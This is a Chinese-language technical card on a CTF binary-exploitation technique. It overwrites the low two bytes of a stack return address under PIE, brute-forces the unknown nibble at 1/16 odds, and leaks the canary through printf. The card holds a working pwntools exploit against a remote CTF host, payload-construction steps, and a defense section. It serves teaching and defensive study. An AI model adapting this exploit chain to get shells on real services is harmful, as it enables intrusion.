---
id: binary-pwn-stack-pie-partial-overwrite-low2-bytes-1-in-16-brute
title: PIE partial write 绕过：覆盖返回地址低 2 字节跳同页后门，第 4 个 nibble 未知按 1/16 概率重连爆破
type: scenario
domain: binary
path: binary/pwn/stack
technique: pie-partial-overwrite-low2-nibble-brute
tags:
- pwn
- stack
- pie
- aslr
- partial-overwrite
- bruteforce
- canary
- ret2text
- ctf
- linux
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V683
  verified_at: '2026-11-13T14:07:07+08:00'
  notes: 已对照原文与19图核对：图15 babypie checksec(Partial RELRO/Canary/NX/PIE)、图16 sub_A3E=system("/bin/sh")、图17 sub_960 buf[6]+两次read(0x30/0x60)+printf %s、图18 返回地址0x400576字节图、图19 exp发送\x3E\xAA命中后ls回显 均与卡片一致；已修正canary泄露机制（0x29字节覆盖canary最低0x00使%s越过，再取7字节rjust补\x00；buf[6]为6个qword=0x30字节）与第4个nibble表述。dedup top候选fork逐页枚举卡为同primitive不同触发环境（fork共享基址 vs 每次连接重新随机化1/16盲试，canary泄露vs逐字节爆破），非同一利用链，保留；dup-scan无本卡pair。find_flag格式串泄露PIE链与既有卡重复，merge跳过合理。无affected_versions；PoC未本机复跑
url: /docs/binary/pwn/stack/binary-pwn-stack-pie-partial-overwrite-low2-bytes-1-in-16-brute/
draft: false
kb_aliases:
- PIE 保护绕过
- partial write
- 部分写入
- 部分覆盖返回地址
- p16 覆盖
- 1/16 爆破
- babypie
- 安恒杯 babypie
- 返回地址低两字节
---

## 一句话结论

PIE 只把加载基址按页（0x1000）随机化，所以**二进制内两个地址的低 12 位只由静态偏移决定**。当栈溢出只能/只需覆盖返回地址低 2 字节时，可以把返回地址改到同一二进制内的后门函数（如 `system("/bin/sh")`）：低字节固定为目标偏移的低字节，地址的第 4 个 nibble（即第二字节的高半字节）取决于未知的 PIE 基址页号（16 种可能），因此每次连接有 1/16 概率命中，失败就重连（新进程、新基址）再试。原文 [安恒杯 2018] babypie 即用此法：先借 `printf("%s")` 带出 canary，再部分覆盖返回地址到 `sub_A3E` 的 `system("/bin/sh")`。

## 原理

- **PIE 随机化粒度是页**：PIE 基址是 `0x1000` 的倍数，实际地址 = 基址 + 静态偏移。基址低 12 位恒为 0，所以任意符号实际地址的低 12 位 = 其静态偏移的低 12 位；只有第 12–15 位（第 4 个十六进制位）随基址页号变化，共 16 种可能。
- **低 2 字节覆盖**：栈溢出 payload 在返回地址处只写 2 字节就结束，返回地址高 6 字节保留原值。原返回地址也在同一二进制代码段内，只要后门与原返回地址的静态偏移落在同一个 64KB 窗口（小体积 PIE 程序通常满足），它们的高位（含 PIE 基址高位）完全相同，只有低 16 位需要改。
- **候选计算**：设原返回地址静态偏移 `0x576`、后门偏移 `0xA3E`，基址低 16 位为 `0xk000`。原返回地址低 16 位 = `0xk576`，后门低 16 位 = `0xkA3E`。低字节 `0x76→0x3E` 是确定的；第二字节要从 `0xk5` 改成 `0xkA`，而 `k` 未知 → 候选 `0x0A,0x1A,0x2A,…,0xFA` 共 16 个。原文脚本选 `b'\x3E\xAA'`（即 `k=0xA`），单次成功率 1/16。
- **为什么能重试**：每次新连接/新进程的 PIE 基址重新随机化，等价于重新掷一次 16 面骰；失败通常表现为崩溃/无输出，重连再发即可，期望约 16 次。若程序是 fork server（子进程继承父进程基址），则不能靠重连换基址，只能在同一个进程内枚举 16 个候选（见关联卡）。
- **canary 同时存在时**：babypie 的 `sub_960` 中 `__int64 buf[6]`（6 个 qword、共 0x30 字节，canary 存在 `buf[5]` 即 `rbp-0x8`），先 `memset(buf,0,32)`，再 `read(0, buf, 0x30)`，随后 `printf("Hello %s:\n", buf)`。第一次发送 `0x29` 字节：前 `0x28` 字节填满缓冲区，第 `0x29` 个字节恰好覆盖 canary 最低字节 `0x00`，`%s` 越过它继续输出 canary 后续 7 字节；接收这 7 字节后用 `\x00` 作为最低字节补齐（`rjust(8, b'\x00')`）即还原完整 canary。第二次 `read(0, buf, 0x60)` 的溢出 payload 用泄露值回填 canary 后即可控制返回地址。
- **调试技巧**：PIE 程序在 gdb 里不能直接 `b main`（符号未重定位），应 `b *$rebase(<IDA 偏移>)`（如 `b *$rebase(0x13F9)`）；需在程序已执行、基址确定后再下断。

## 触发条件

- Linux x86-64 二进制开启 PIE，存在可覆盖返回地址的栈溢出，且溢出长度可控制到“只改返回地址低 2 字节”。
- 二进制内存在可直接调用的后门/目标函数（如 `system("/bin/sh")` / `system("/bin/cat flag.txt")`），其静态偏移已知，且与原返回地址的静态偏移在同一 64KB 窗口内（小二进制常见）。
- 若开启 canary，需要先泄露/爆破 canary（本例用 `printf("%s")` 带出）。
- 攻击者可发起多次连接/重跑进程（每次重新随机化基址），接受 1/16 的单次成功率；或目标为 fork server 时改用同进程枚举（不同场景）。
- Full RELRO/NX 不影响本方法（只改返回地址到二进制代码）。

## 利用步骤

1. `checksec` 确认 PIE + Canary + NX（原文 babypie：Partial RELRO、Canary、NX、PIE）。
2. IDA 定位漏洞函数 `sub_960`（`buf[6]` 两次 `read`）与后门 `sub_A3E`（`return system("/bin/sh")`），记录后门静态偏移 `0xA3E` 与原返回地址偏移 `0x576`。
3. 泄露 canary：第一次发送 0x29 字节（0x28 字节填充 + 1 字节覆盖 canary 最低的 `0x00`），`printf("Hello %s:")` 越过被覆盖的低字节输出 canary 后续 7 字节，接收后 `rjust(8, b'\x00')` 得到 canary。
4. 构造 payload：`b'a'*(0x30-0x8) + p64(canary) + b'a'*8 + b'\x3E\xAA'`（0x30 为 buf 到 canary 的偏移，末尾 2 字节为候选返回地址低 16 位）。
5. 发送并观察：若拿到 shell（如 `ls` 输出、读到 flag）即命中；若崩溃/无回显，重新连接换基址再试，直到 16 分之一命中。
6. 若要提高效率可写循环按 16 个候选 `0x0A,0x1A,…,0xFA` 重连尝试；fork server 场景则在同进程内按 +0x1000 枚举。

## PoC

原文 babypie exp（未在本机复跑）：

```python
from pwn import *
context.os = 'Linux'; context.arch = 'amd64'; context.log_level = 'debug'
p = remote('node4.buuoj.cn', 25238)

p.sendafter('Name:\n', b'a'*0x29)                       # 触发 printf("%s") 带出 canary
p.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
canary = u64(p.recv(7).rjust(8, b'\x00'))
print('canary:' + str(canary))

payload = b'a'*(0x30-0x8) + p64(canary) + b'a'*8 + b'\x3E\xAA'
p.sendafter('\n', payload)                               # 低 2 字节覆盖，1/16 命中 sub_A3E
p.interactive()
```

说明：`b'\x3E\xAA'` 对应后门低 16 位 `0x?A3E` 中 `? = A` 的候选；失败重连即可。

## 变体与关联

- **fork 共享基址逐页枚举**：[[binary-pwn-stack-pie-page-bruteforce-fork-partial-overwrite]] 同样是 p16 部分覆盖到后门，但程序是 fork server（子进程继承同一 PIE 基址），在同一个进程内按 `0x1000` 步进枚举 16 页；本卡是每次连接重新随机化基址、按 1/16 概率盲试，触发环境与 PoC 不同。
- **单字节同页覆盖**：[[ctf-pwn-onebyte-ret-overwrite-backdoor-system]] 是 32 位、只改最低 1 字节、后门与原返回地址同 256 字节页，无需爆破；本卡是 64 位改 2 字节、第 4 nibble 未知需 16 选一。
- **泄露路线**：若能泄露代码地址（格式化字符串/puts 越界等），可先算 PIE 基址再精确 ROP（见 [[binary-pwn-stack-pie-base-leak-csu-init-return-address]]、[[binary-pwn-format-string-canary-libc-leak-rop-system]] 的 PIE 变体说明），无需爆破；部分覆盖是“无泄露”路线。
- **边界**：二进制大于 64KB 或目标与原返回地址跨 64KB 窗口时需要覆盖 3 字节（候选扩大）；PIE 随机化位数更高导致高位不同则不成立；每次连接 exec 新进程是 1/16 重试的前提，fork 复用基址则需同进程枚举。

## 检测与防御

- **检测**：同一服务短时间大量连接且每个连接都以崩溃结束（crash oracle）；payload 呈现“固定填充 + canary 形态 8 字节 + 仅 2 字节返回地址覆盖”的结构；`__stack_chk_fail`/段错误高频重复。
- **防御**：修复栈溢出（有界拷贝）；保留 Canary + PIE + Full RELRO；服务端每次请求 `exec` 新进程（避免 fork 继承基址被枚举）；对高频崩溃连接做速率限制与告警；高价值目标可启用 CET/CFI 提高部分覆盖后的控制流合法性门槛。
- **说明**：PIE 的页粒度随机化天然允许 partial overwrite；它提高的是完整地址泄露的难度，不阻止同页/同 64KB 窗口内的低字节改写，因此仍需配合 canary、代码完整性与崩溃监控。
